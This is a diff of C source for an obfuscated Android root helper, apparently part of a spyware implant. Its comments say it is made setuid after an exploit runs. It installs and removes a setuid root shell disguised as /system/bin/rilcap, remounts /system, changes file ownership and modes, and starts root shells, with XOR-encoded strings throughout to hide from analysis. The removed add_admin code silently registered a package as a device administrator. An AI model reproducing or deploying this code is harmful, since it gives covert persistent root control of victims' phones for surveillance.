@@ -47,7 +47,6 @@ static int remount(const char *mntpoint, int flags);
 static int my_mount(const char *mntpoint);
 static void my_chown(const char *user, const char *group, const char *file);
 static void my_chmod(const char *mode, const char *file);
-static void add_admin(const char *appname);
 static void copy_root(const char *mntpnt, const char *dst);
 static void copy_remount(const char *mntpnt, const char *src, const char *dst);
 static void delete_root(const char *mntpnt, const char *dst);
@@ -55,6 +54,12 @@ static int append_content(const char *content, const char *file);
 static int search_content(const char *content, const char *file);
 //static int get_framebuffer(char *filename);
 static unsigned char* deobfuscate(unsigned char *s);
+
+static unsigned char ld_library_path[] = "\x92\x6f\xf2\x22\x2a\x53\x22\x25\x50\x40\x2d\x40\x55\x53\x5e\x2d\x5a\x26"; // "LD_LIBRARY_PATH"
+static unsigned char system_libs[] = "\x5a\xed\xa0\x8f\xf4\xc1\xcc\xc6\xcf\xf8\x8f\xce\xcd\xc8\xa0\x8f\xfb\xfd\xfb\xf6\xc1\xc9\x8f\xce\xcd\xc8"; // "/vendor/lib:/system/lib"
+
+static unsigned char old_name_shell[] = "\x6d\x4c\x33\xc2\x26\x2c\x26\x29\x18\x00\xc2\x17\x1c\x03\xc2\x27\x1c\x01\x16\x14\x25"; // "/system/bin/rilcap"
+
 
 // questo file viene compilato come rdb e quando l'exploit funziona viene suiddato
 // statuslog -c "/system/bin/cat /dev/graphics/fb0"
@@ -83,7 +88,6 @@ int main(int argc, char** argv) {
 	unsigned char qzs[] = "\x17\xc1\xd5\xe6\xef\xe4"; // "qzs"
 	unsigned char binsh1[] = "\xdf\x14\xc5\x10\xd4\xae\xd4\xab\xda\xd2\x10\xc5\xde\xd1\x10\xd4\xdf"; // "/system/bin/sh"
 	unsigned char binsh2[] = "\x0b\xeb\xee\xe4\x88\xb6\x88\x81\xb2\xba\xe4\xbf\xa6\xbb\xe4\x88\xa5"; // "/system/bin/sh"
-	unsigned char adm[] = "\x5b\x25\x7d\x7a\x41\x7e"; // "adm"
 	unsigned char sh[] = "\x6a\xe2\x8a\x19\x06"; // "sh"
 	unsigned char lid[] = "\xb2\xf9\x48\x2e\x2d\x36"; // "lid"
 	unsigned char rf[] = "\xf9\x6f\x94\x95\x61"; // "rf"
@@ -113,7 +117,6 @@ int main(int argc, char** argv) {
 		LOG("fhs <mntpoint> <src> <dest> - copy <src> to <dst> on mountpoint <mntpoint>\n");
 		LOG("fho <user> <group> <file> - chown <file> to <user>:<group>\n");
 		LOG("pzm <newmode> <file> - chmod <file> to <newmode>\n");
-		LOG("adm <package name/receiver>\n");
 		LOG("qzs - start a root shell\n");
 		LOG("lid <proc> <dest file> - return process id for <proc> write it to <dest file>\n");
 		LOG("ape <content> <dest file> - append text <content> to <dest files> if not yet present\n");
@@ -121,7 +124,52 @@ int main(int argc, char** argv) {
 		
 		return 0;
 	}
+
+
+	    // Sanitize all secure environment variables (from linker_environ.c in AOSP linker).
+    /* The same list than GLibc at this point */
+    unsigned char* unsec_vars[] = {
+      "\x6e\xe6\x82\xe9\xf5\xe1\xe0\xf8\xf1\xc2\xf3\xc6\xea",                                         // "GCONV_PATH"
+      "\x16\x2a\x37\x51\x57\x46\x55\xa9\xa8\x50\x59\x56\xa3\x44",                                     // "GETCONF_DIR"
+      "\x17\x35\x29\xa1\xb8\x4c\x4d\xbe\xa5\xa6\xbe\x4c\xb2\x4c",                                     // "HOSTALIASES"
+      "\xcc\x82\x46\x80\x88\x97\x8d\x99\x88\x85\x98",                                                 // "LD_AUDIT"
+      "\x9b\xdf\x4c\x69\x61\x7c\x61\x62\x67\x72\x64",                                                 // "LD_DEBUG"
+      "\x35\x15\x2f\x9b\x93\x6a\x93\x90\x99\x60\x92\x6a\x9a\x60\x63\x6f\x60\x63",                     // "LD_DEBUG_OUTPUT"
+      "\x3c\x66\x55\xb0\xb8\xaf\xb8\xad\xbe\x85\xb1\xbd\x83\xaf\xb7\xb9\x85\xbb",                     // "LD_DYNAMIC_WEAK"
+      "\xec\xc2\x21\xa0\xa8\xb7\xa0\xa5\xb2\x42\xad\x42\xb5\xb7\xbc\xad\xb8\xa4",                     // "LD_LIBRARY_PATH"
+      "\xee\x95\x75\xa2\xaa\xd3\xa3\xc4\xa9\xab\xa9\xa0\xd3\xc6\xd1\xda\xae",                         // "LD_ORIGIN_PATH"
+      "\xed\x59\xbe\xa3\x5b\x52\x4f\x41\x58\xa3\xa2\x5c\x5b",                                         // "LD_PRELOAD"
+      "\xdd\x1c\xcb\xb1\xa9\x82\xb5\xb7\xb2\xab\xac\xb1\xa8",                                         // "LD_PROFILE"
+      "\x87\xca\x41\x5f\x47\x68\x54\x53\x58\x50\x68\x5a\x56\x63\x51\xa2",                             // "LD_SHOW_AUXV"
+      "\x60\x04\x74\x34\x2c\x47\x3d\x33\x2d\x47\x34\x37\x21\x2c\x47\x22\x29\x21\x33",                 // "LD_USE_LOAD_BIAS"
+      "\x8e\x25\xa0\xc2\xc3\xd7\xd1\xc2\xca\xc3\xcd\xd1\xc9\xc0",                                     // "LOCALDOMAIN"
+      "\x94\xd5\x46\x78\x65\x79\x4c\x7f\x40\x64",                                                     // "LOCPATH"
+      "\xe0\xe5\x09\x77\x63\x74\x74\x71\x6d\x41\x7c\x72\x63\x6d\x6f\x3b",                             // "MALLOC_TRACE"
+      "\x02\x30\x3f\x4f\x43\x4e\x4e\x4d\x41\xbd\x41\x4a\x47\x41\x49\xbd",                             // "MALLOC_CHECK_"
+      "\xf9\x13\xe2\xd9\xd0\xae\xaa\xaf\xd8\xd3\xd7",                                                 // "NIS_PATH"
+      "\xf5\x05\xf7\xc5\xbb\xae\xaf\xbc\xa3\xc7",                                                     // "NLSPATH"
+      "\x28\xc5\xfd\xfa\xf7\x85\xe9\xec\x86\xf9\xe0\xe9\x85\x84\xf9\xf5\xe9\xee\xf6",                 // "RESOLV_HOST_CONF"
+      "\xde\x47\x92\x94\xa5\x93\x8f\x9f\x92\x96\x99\x9f\x90\x93",                                     // "RES_OPTIONS"
+      "\x87\x04\x85\xd3\xca\xdf\xc3\xd6\xdd",                                                         // "TMPDIR"
+      "\xf1\x5e\xaa\x5d\x57\x4d\x48\x5f",                                                             // "TZDIR
+      "\x9c\x1e\x97\xf0\xe8\xff\xe5\xef\xf9\xf8\xff\xf0\xed\xe2\xf2\xe5\xf2\xfd\xff\xf4\xe5\xf8\xec\xc5", // "LD_AOUT_LIBRARY_PATH"
+      "\x20\x14\x3b\x94\x6c\x87\x61\x97\x9d\x9c\x87\x90\x92\x6d\x94\x97\x61\x6c",                     // "LD_AOUT_PRELOAD"
+      // not listed in linker, used due to system() call
+      "\xe4\xca\x2d\xbd\xa6\x4b",                                                                     // "IFS",
+    };
+
+    int h = 0;
+    for(h=0; h<sizeof(unsec_vars)/sizeof(unsec_vars[0]); h++)
+      unsetenv(deobfuscate(unsec_vars[h]));
+
+    /*
+     * set LD_LIBRARY_PATH if the linker has wiped out it due to we're suid.
+     * This occurs on Android 4.0+
+     */
+    setenv(deobfuscate(ld_library_path), deobfuscate(system_libs), 0);
 	
+
+
 	setgod();
 	
 	// Cattura uno screenshot
@@ -156,10 +204,12 @@ int main(int argc, char** argv) {
 		remount(deobfuscate(system2), 0);
 	} else if (strcmp(argv[1], deobfuscate(rt)) == 0) {  // Copia la shell root in /system/bin/rilcap
 		LOG("Installing suid shell\n");
-		copy_root(deobfuscate(system3), deobfuscate(ROOT_CLIENT));
+		delete_root(deobfuscate(system4), deobfuscate(ROOT_BIN));
+		copy_root(deobfuscate(system3), deobfuscate(ROOT_BIN));
+		delete_root(deobfuscate(system4), deobfuscate(old_name_shell));
 	} else if (strcmp(argv[1], deobfuscate(ru)) == 0) {  // Cancella la shell root in /system/bin/rilcap
 		LOG("Removing suid shell\n");
-		delete_root(deobfuscate(system4), deobfuscate(ROOT_CLIENT));
+		delete_root(deobfuscate(system4), deobfuscate(ROOT_BIN));
 	} else if (strcmp(argv[1], deobfuscate(rf)) == 0) {  // Cancella un file dal filesystem
 		LOG("Removing %s from %s\n", argv[3], argv[2]);
 		delete_root(argv[2], argv[3]);
@@ -187,10 +237,6 @@ int main(int argc, char** argv) {
 	} else if (strcmp(argv[1], deobfuscate(pzm)) == 0) { // chmod: newmode file
 		LOG("Chmodding to %s file %s\n", argv[2], argv[3]);
 		my_chmod(argv[2], argv[3]);
-		return 0;
-	} else if (strcmp(argv[1], deobfuscate(adm)) == 0) { // Add the application to the admin list
-		LOG("Adding the app %s to Administrators list\n", argv[2]);
-		add_admin(argv[2]);
 		return 0;
 	} else if (strcmp(argv[1], deobfuscate(lid)) == 0) { // Write pid of a process to file
 		LOG("Returning process ID for %s to %s\n", argv[2], argv[3]);
@@ -706,97 +752,6 @@ static int my_mount(const char *mntpoint) {
     }
 
     return mount(dev, mntpoint, fstype, 0, 0);
-}
-
-static void add_admin(const char *appname) {
-	unsigned char pfile[] = "\x6e\xaa\xe4\x41\x1e\x13\x6e\x13\x41\x6d\x6b\x6d\x6e\x1f\x07\x41\x1e\x1f\x68\x1b\x1d\x1f\x71\x62\x01\x06\x1b\x1d\x1b\x1f\x6d\x40\x6a\x07\x06"; // "/data/system/device_policies.xml"
-	unsigned char policies[] = "\xf0\x99\x63\xfc\x80\xa1\xac\xab\xb5\xab\xb7\x85\xfe"; // "<policies>"
-	unsigned char cpolicies[] = "\xaa\x7a\xdc\x6a\x2e\x45\x3a\x47\x39\x47\x33\x29\x7e\x85\x74"; // "<policies />"
-	unsigned char cpol[] = "\x4b\x1d\x5d\x89\x9c\x45\x5c\x59\x22\x58\x22\x56\x48\x8f"; // "</policies>"
-	unsigned char admin1[] = "\x85\xe1\x6a\x91\x7b\x24\x23\x28\x2c\x2d\x67\x2d\x24\x28\x20\x78\x69"; // "\n<admin name=""
-
-	// com.android.networking/com.android.networking.listener.AR
-	unsigned char admin2[] =  "\xbe\xfe\x65\x64\x80\x4c\x7e\x32\x31\x2e\x2b\x25\x2b\x27\x35\x62\x28\x2e\x23\x29\x35\x7f\x64\x76\x79\x7b\x64\x62\x71\x80\x4c\x7e\x71\x23\x26\x2f\x2b\x30\x80\x4c"; // "\">\n<policies flags=\"479\" />\n</admin>\n"
-	unsigned char init[] = "\x67\xdf\x80\xe5\xe8\x21\x36\x35\xf9\x2f\x3e\x2b\x2c\x32\x38\x37\xe6\xc0\xea\xf7\xe9\xc0\xf9\x3e\x37\x3c\x38\x3d\x32\x37\x00\xe6\xc0\x2e\x2d\x3f\xf6\xe1\xc0\xf9\x2c\x2d\x3a\x37\x3d\x3a\x35\x38\x37\x3e\xe6\xc0\x22\x3e\x2c\xc0\xf9\xe8\xe7"; // "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>"
-	unsigned char nl[] = "\x26\x45\x62\x34"; // "\n"
-    char *buf = NULL;
-    char *ptr = NULL;
-
-    int fd, size;
-
-    fd = open(deobfuscate(pfile), O_RDWR);
-
-    if (fd < 0) {
-        LOG("Policy file cannot be opened\n");
-        return;
-    }
-
-    size = lseek(fd, 0, SEEK_END);
-    lseek(fd, 0, SEEK_SET);
-
-    if (size == 0) {
-        write(fd, deobfuscate(init), strlen(deobfuscate(init)));
-        write(fd, deobfuscate(cpolicies), strlen(deobfuscate(cpolicies)));
-        size = lseek(fd, 0, SEEK_END);
-        lseek(fd, 0, SEEK_SET);
-    }
-
-    if (size == 0) {
-        LOG("Something went terribly wrong here\n");
-        return;
-    }
-
-    buf = (char *)malloc(size + 1);
-
-    if (buf == NULL) {
-        LOG("Cannot allocate memory\n");
-        close(fd);
-        return;
-    }
-
-    memset(buf, 0x00, size + 1);
-
-    read(fd, buf, size);
-    lseek(fd, 0, SEEK_SET);
-
-	if (strstr(buf, appname)) {
-		LOG("Application already in the manifest\n");
-		memset(buf, 0x00, size + 1);
-		free(buf);
-		close(fd);
-		return;
-	}
-	
-    ptr = strstr(buf, deobfuscate(policies));
-
-    // No admins already set
-    if (ptr == NULL) {
-        ptr = strstr(buf, deobfuscate(cpolicies));
-
-        if (ptr == NULL) {
-            LOG("Malformed file\n");
-            return;
-        }
-
-        write(fd, buf, ptr - buf);
-        write(fd, deobfuscate(nl), strlen(deobfuscate(nl)));
-        write(fd, deobfuscate(policies), strlen(deobfuscate(policies)));
-        write(fd, deobfuscate(admin1), strlen(deobfuscate(admin1)));
-        write(fd, appname, strlen(appname));
-        write(fd, deobfuscate(admin2), strlen(deobfuscate(admin2)));
-        write(fd, deobfuscate(cpol), strlen(deobfuscate(cpol)));
-    } else {
-        write(fd, buf, (ptr - buf + strlen(deobfuscate(policies))));
-        write(fd, deobfuscate(admin1), strlen(deobfuscate(admin1)));
-        write(fd, appname, strlen(appname));
-        write(fd, deobfuscate(admin2), strlen(deobfuscate(admin2)));
-        write(fd, ptr + strlen(deobfuscate(policies)), strlen(ptr + strlen(deobfuscate(policies))));
-    }
-
-    memset(buf, 0x00, size + 1);
-    free(buf);
-    close(fd);
-    LOG("Administrator app added successfully\n");
 }
 
 
